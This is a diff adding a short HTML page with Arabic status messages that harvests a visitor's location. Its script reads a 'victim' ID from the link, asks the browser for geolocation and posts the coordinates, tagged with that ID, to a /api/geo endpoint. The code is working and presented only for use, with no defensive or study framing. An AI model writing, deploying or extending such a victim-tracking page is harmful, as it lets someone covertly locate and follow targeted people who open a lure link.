@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Geolocation</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h2>📍 الحصول على الموقع...</h2>
+    <p id="status">جارٍ تحديد موقعك...</p>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const victimId = params.get("victim");
+
+        if (!victimId) {
+            document.getElementById("status").innerText = "❌ لا يوجد Victim ID";
+        } else {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        fetch(`/api/geo?victim=${victimId}`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            })
+                        })
+                        .then(res => res.json())
+                        .then(data => {
+                            document.getElementById("status").innerText = "✅ تم إرسال الموقع!";
+                        })
+                        .catch(err => {
+                            document.getElementById("status").innerText = "❌ خطأ في الإرسال";
+                        });
+                    },
+                    error => {
+                        document.getElementById("status").innerText = "❌ فشل تحديد الموقع";
+                    }
+                );
+            } else {
+                document.getElementById("status").innerText = "❌ المتصفح لا يدعم الموقع";
+            }
+        }
+    </script>
+</body>
+</html>
